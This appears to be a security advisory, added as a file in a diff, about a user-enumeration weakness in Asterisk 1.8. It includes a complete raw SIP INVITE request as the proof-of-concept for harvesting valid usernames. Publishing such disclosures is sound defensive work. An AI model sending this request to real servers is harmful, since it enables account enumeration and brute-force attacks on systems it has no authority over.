@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/47676/info
+
+Asterisk is prone to a user-enumeration weakness.
+
+An attacker may leverage this issue to harvest valid usernames, which may aid in brute-force attacks.
+
+This issue affects Asterisks 1.8. 
+
+The following request is available:
+
+INVITE sip:192.168.2.1 SIP/2.0
+CSeq: 3 INVITE
+Via: SIP/2.0/UDP www.example.com:5060;branch=z9hG4bK78adb2cd-0671-e011-81a1-a1816009ca7a;rport
+User-Agent: TT
+From: <sip:105@192.168.2.1>;tag=642d29cd-0671-e011-81a1-a1816009ca7a
+Call-ID: 5RRdd5Cv-0771-e011-84a1-a1816009ca7a@lapblack2
+To: <sip:500@192.168.2.1>
+Contact: <sip:105@localhost>;q=1
+Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,SUBSCRIBE,NOTIFY,REFER,MESSAGE,INFO,PING
+Expires: 3600
+Content-Length: 0
+Max-Forwards: 70 
